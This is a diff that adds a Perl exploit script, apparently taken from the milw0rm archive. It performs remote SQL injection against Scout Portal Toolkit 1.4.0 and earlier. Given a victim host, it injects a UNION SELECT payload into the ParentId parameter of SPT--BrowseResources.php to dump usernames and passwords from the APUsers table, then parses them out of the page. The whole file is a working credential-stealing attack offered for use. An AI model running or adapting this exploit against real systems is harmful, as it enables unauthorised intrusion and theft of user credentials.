@@ -1,0 +1,39 @@
+#!/usr/bin/perl
+
+# Scout Portal Toolkit <= 1.4.0 (ParentId) Remote SQL Injection Exploit
+# Discovered & Coded by JosS
+# Contact: sys-project[at]hotmail.com
+# Spanish Hackers Team / Sys - Project / EspSeC
+# http://www.spanish-hackers.com
+# rgod forever :D
+
+
+print "\t\t########################################################\n\n";
+print "\t\t#  Scout Portal Toolkit <= 1.4.0 SQL Injection Exploit #\n\n";
+print "\t\t#                       by JosS                        #\n\n";
+print "\t\t########################################################\n\n";
+
+use strict;
+use LWP::UserAgent;
+
+my $victim = $ARGV[0];
+
+ if(!$ARGV[0]) {
+    print "\n[x] Scout Portal Toolkit <= 1.4.0 Remote SQL Injection Exploit\n";
+    print "[x] written by JosS - sys-project[at]hotmail.com\n";
+    print "[x] usage: perl xpl.pl [host]\n";
+    print "[x] example: http://localhost/path/\n\n";
+    exit(1);
+ }
+ 
+    print "\n[+] Exploiting...\n";
+    my $cnx = LWP::UserAgent->new() or die;
+    my $go=$cnx->get($victim."/SPT--BrowseResources.php?ParentId=337+and+1=2+union+all+select+0,1,2,3,4,concat(UserName,char(34),UserPassword),6,7,8+from+APUsers/*");
+    if ($go->content =~ m/APUsers\/\*\' class=\'\'>(.*?)\<\/a>/ms)
+ {
+        print "[+] $1\n\n";
+    } else {
+        print "\n[-] exploit failed\n";
+    }
+
+# milw0rm.com [2008-05-04]
